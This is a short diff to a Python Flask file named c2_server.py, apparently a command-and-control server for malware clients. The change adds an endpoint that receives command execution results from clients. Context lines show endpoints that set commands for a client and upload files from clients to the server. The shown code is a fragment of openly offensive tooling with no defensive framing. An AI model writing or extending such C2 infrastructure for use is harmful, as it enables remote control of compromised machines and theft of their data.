@@ -1,5 +1,5 @@
 # c2_server.py - Ethan Zeevi
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import os
 
 app = Flask(__name__)
@@ -44,6 +44,13 @@ def set_command(client_id):
         return jsonify({'status': 'command set'})
     else:
         return jsonify({'status': 'client not found'}), 404
+
+@app.route('/result/<client_id>', methods=['POST'])
+def receive_result(client_id):
+    # Receive the command execution result from the client
+    data = request.json
+    print(f"Result from {client_id}: {data['result']}")
+    return jsonify({'status': 'ok'})
 
 # Uploads file from client to server
 @app.route('/upload/<client_id>', methods=['POST'])
